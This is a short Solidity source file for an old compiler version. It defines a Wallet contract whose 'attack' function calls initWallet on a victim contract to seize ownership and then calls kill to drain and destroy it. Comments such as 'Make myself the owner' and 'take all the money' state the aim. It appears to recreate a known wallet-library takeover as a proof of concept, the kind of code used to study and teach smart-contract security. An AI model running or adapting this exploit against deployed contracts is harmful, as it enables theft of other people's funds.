pragma solidity ^0.4.8;

contract Wallet {
    address _walletLibrary;
    address public owner;

    function Wallet() {
        owner = msg.sender;
    }

    function withdraw(uint amount) returns (bool success) {
        return _walletLibrary.call(bytes4(sha3("withdraw(uint)")), amount);
    }
    
    function attack( address victim) {
        // Make myself the owner 
        victim.call(bytes4(sha3("initWallet(address)")), owner);
        // I am now the owner !!!
        
        //Call kill to take all the money and destroy the contract
        victim.call(bytes4(sha3("kill(address)")), owner);
    }

    // fallback function gets called if no other function matches call
    function () payable {
        _walletLibrary.call(msg.data);
    }
}